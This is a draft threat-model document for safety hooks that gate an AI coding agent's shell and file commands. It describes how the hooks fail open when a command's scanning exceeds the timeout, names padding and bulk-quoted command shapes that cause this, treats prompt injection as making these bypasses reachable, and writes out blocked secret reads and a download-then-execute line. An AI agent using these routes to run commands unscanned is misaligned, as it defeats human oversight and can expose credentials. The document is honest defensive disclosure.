# Threat model — what these gates stop, and what they do not

> **STATUS: DRAFT, 2026-08-13. NOT YET EMITTED INTO INSTALLS.** Written for owner
> review. If accepted, the substance belongs in the emitted `secrets.md`, the
> emitted README and the PRD — the point of this document is worthless if it
> stays in the repo and never reaches the operator it is written for.

## The one-sentence version

**These gates raise the cost of an agent's mistakes. They do not resist an
adversary who controls the text of a command.**

If you read one thing, read that, and calibrate accordingly.

## Why this document exists

A gate that can be bypassed is worse than no gate in exactly one way, and it is
worth being precise about it: **it changes your behaviour on a promise it cannot
keep.** If the emitted `secrets.md` tells you `.env` is blocked, you may leave a
credential somewhere you otherwise would not have. Without the gate you would
know you had no protection and would act accordingly.

Everything below exists so that you can decide what to trust these gates with.
Nothing here is a plan to fix them. Where something is open, it says so.

## In scope — what these gates are genuinely good at

The threat model is **an agent making a mistake**: a wrong command, a
hallucinated package, a path it should not have touched, a plausible-looking
install line from a README it just read.

- `cat .env`, `cat secrets/prod.yaml` and their relatives are denied on the
  `Bash` surface as well as through the file tools.
- Unapproved dependency installs are denied.
- The gates fail closed on **their own** errors — a missing parser, an
  unwritable filesystem, malformed input.
- Verdicts agree across both substrates on a 4104-row differential.

This is the common case, it is most of what goes wrong day to day, and the gates
handle it.

## OUT OF SCOPE — say no to these, explicitly

### 1. A motivated adversary who controls command text

The gates are cost-bounded, and cost is attacker-reachable. **Crossing the 60 s
ceiling is a BYPASS, not a refusal:** a cancelled hook exits 124/137/143, only
exit 2 blocks a `PreToolUse` call, so the call proceeds and the command runs
unscanned. The declared timeout is the attacker's budget, not your safety net.

Two open, measured classes — **and they are not equally hard to reach**, which
matters more than their shared severity:

- **`X-55`, and density-tuned padding generally — adversarial-only.** These need
  a payload built on purpose: ~80 KB tuned for delimiter density, or a specific
  decider shape. No agent constructs one incidentally. A person trying to get
  past the gate does it deliberately, and succeeds.
- **`X-54` — NOT adversarial-only, and do not read it as such.** Its shape is a
  wrapper head plus ~2000 single-quoted runs, inside every declared cap. That is
  a **bulk file operation with quoted paths** — `sudo chown user 'file one'
  'file two' …` across a couple of thousand files. It is an ordinary command
  that happens to be large and quoted. Supervised, you would probably question
  such a command anyway; **unattended, nothing does.** See §5.

### 2. Prompt injection

This is the case that most deserves your attention, because **it converts the
out-of-scope class into the in-scope one.** If a fetched page, an issue comment
or a dependency's README can steer the agent, then command text is partly
attacker-authored, and everything in §1 becomes reachable without a human at the
keyboard.

**A better model does not help here, and may hurt.** A more capable,
more faithfully instruction-following model is not less steerable by injected
instructions. And it is irrelevant to the bypasses in §1, which are properties
of a bash tokenizer's cost curve with the model nowhere in them.

If your agent reads untrusted content and can then run shell commands, treat
these gates as advisory.

### 3. Download-then-execute

`curl <url> -o python3 ; ./python3` and its variants are **not** reliably caught
(backlog `C-6` / `X-36r` / `X-36i`). This one is listed under out-of-scope but is
tracked as accident-reachable — an agent can arrive at it unaided — and is
prioritised accordingly.

### 4. The SDK substrate

`.claude/sdk_gates/gates.py` has **never been executed against the real
`claude_agent_sdk`** — only against a hand-written stub (`C-7`). **The shell
substrate is the supported one.** If you set `gate_substrate: "sdk-callable"`,
you are ahead of the evidence.

### 5. Autonomous loops — STATUS CHANGED 2026-08-13, READ THIS ONE TWICE

`loop.sh`, `goal-loop.sh` and `auto.sh` are **guarded skeletons that dispatch
nothing** (`C-2`). They carry the eligibility guards, sentinels and usage-limit
handling, print the command you would run, and exit 1 with *"No agent work was
dispatched."* This is deliberate, not broken — but autonomous mode is not
implemented, and no gate posture here has been validated under unattended
operation.

**The owner has prioritised implementing this (2026-08-13), and that changes what
the rest of this page means.** Everything above assumes a human sees each
command and the gates are a second line of defence. **Unattended dispatch removes
that assumption**, and two consequences follow that are not obvious:

* **The cost ceiling stops being adversarial-only.** The shape that crosses it is
  `sudo` followed by ~2000 single-quoted runs — which is a **bulk file operation
  with quoted paths**, not an attack payload. Supervised, you would question such
  a command yourself. Unattended, ordinary bulk work reaches it.
* **A crossed ceiling is silent.** The hook is cancelled, exits 124, and the
  command runs unscanned. In a loop, nothing observes that.

**Do not enable autonomous mode until the head-class cost measurement has been
run on the tree you intend to run it on.** That measurement is owed and has not
been taken. Until then, treat unattended operation as running with the gates
advisory rather than enforcing.

## How to use this honestly

- **Do** use these gates to catch agent mistakes. That is what they are for and
  they do it well.
- **Do not** put a secret behind them that you would not put behind a `.gitignore`
  and a code review.
- **Do not** rely on them if your agent consumes untrusted content and can run
  shell commands.
- **Do** keep them: catching most accidents is worth having, provided you are
  not miscalibrated about the rest — which is the entire purpose of this page.

## Provenance

Every claim here is measured, not inferred. The fail-open mechanism was verified
live against Claude Code (a hook sleeping past `timeout: 2` that would then
`exit 2` is killed and the command runs; the same hook allowed to finish blocks
it). The cost classes are in `docs/deferred-backlog.md` cluster X with their
payloads and wall-clock figures. The reasoning is in
`docs/agentic-harness-security-kb.md` §4.11.

**A fresh head-class cost measurement on the current tree is owed and has not
been run.** The figures behind §1 were taken on earlier commits.
